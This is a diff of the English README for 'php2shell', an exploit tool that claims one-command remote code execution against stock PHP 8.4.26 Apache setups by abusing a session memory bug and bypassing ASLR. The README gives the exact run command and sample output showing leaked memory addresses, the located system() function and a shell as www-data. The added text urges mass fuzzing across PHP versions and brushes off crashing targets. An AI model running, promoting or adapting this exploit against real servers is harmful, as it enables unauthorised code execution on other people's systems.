@@ -1,19 +1,28 @@
-# php2shell — PHP 8.4.26 session vulnerability reproduction
+# php2shell - Official environment, no `display_errors` needed, `memory_limit` untouched
 
 [中文](README.md) | English
 
-**The target has not changed: stock official `php:8.4.26-apache` with the
-official `php.ini-production` — `display_errors=Off`,
-`display_startup_errors=Off`, `memory_limit=128M`, `post_max_size=8M`,
-single-worker prefork.** Under the constraints of being fully remote,
-HTTP-only, with the target page containing only `<?php echo "OK\n"; ?>`
-and no PHP written on the target side, one command reaches RCE:
+**Single-worker prefork.** In a fully remote, HTTP-only setting, with only
+`<?php echo "OK\n"; ?>` on the target page and no PHP written on the target
+side, one command reaches RCE:
 
 - stock official image + official ini: **5/5**
 - the same official build with symbols (gdb used only for offline
   calibration, never on the delivery path): **15/15**
 - about 2 seconds per run, the worker is not restarted, the target ini is
   left untouched
+
+# General exploitation
+
+In principle, once you compute the offsets for every PHP version and fuzz
+with them in bulk, one of those fuzz runs will eventually reach RCE.
+Besides, a crashed worker restarts anyway, so there is no fear of knocking
+the target offline.
+
+As for workers: a single worker does not affect whether the exploit works,
+only the success rate. In the test environment we temporarily use a single
+worker to show it off; the full official worker setup will be released
+later.
 
 ## Quick start (official php.ini-production / display_errors=Off / 128M)
 
@@ -31,6 +40,12 @@ cd php2shell-bypass-aslr-exp
 
 # 2) One command: A1 -> B1 leak -> A2 -> B2 -> id
 python3 pure/pwn_pure.py --port 18110
+# [try 1] A1: END-cleanup send_cookie OOM
+# [try 1] B1: stale-id OOB read (chunk base + libphp)
+#       decoded=819208 zval_ptr_dtor=0x7fe00ef5db60 -> libphp=0x7fe00e8ff000
+#       chunk buckets: [('0x7fe00c600000', 7495), ('0x7fe00ee00000', 1095),
+#                       ('0x7fe00cc00000', 87), ('0x7fe00c400000', 79)]
+# [try 1] A2 + B2: main=0x7fe00cc00000 S=0x7fe00ccf8398 zif_system=0x7fe00ed64370
 # [4/4] RCE OK; proof .../out/p1:
 # uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
